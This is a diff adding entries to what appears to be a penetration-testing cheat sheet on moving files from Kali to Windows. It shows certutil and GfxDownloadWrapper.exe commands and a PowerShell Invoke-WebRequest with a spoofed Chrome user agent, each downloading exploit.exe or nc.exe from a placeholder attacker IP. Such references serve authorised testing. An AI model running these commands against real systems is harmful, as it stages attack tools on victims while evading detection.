@@ -1170,6 +1170,12 @@ C:\> certutil.exe -urlcache -split -f http://<IP address>/exploit.exe
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
 ```
 
+- GfxDownloadWrapper.exe (Kali -> Windows)
+
+```
+PS C:\> GfxDownloadWrapper.exe "http://<IP address>/nc.exe" "C:\Temp\nc.exe"
+```
+
 - JavaScript (cscript.exe) Downloads (Kali -> Windows)
 
 ```
@@ -1224,6 +1230,10 @@ Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
 ```
 https://useragentstring.com/index.php
 https://useragentstring.com/pages/useragentstring.php
+
+PS C:\>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+PS C:\> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\> Invoke-WebRequest http://<IP address>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
 #8. - Restricted Shell Escapes
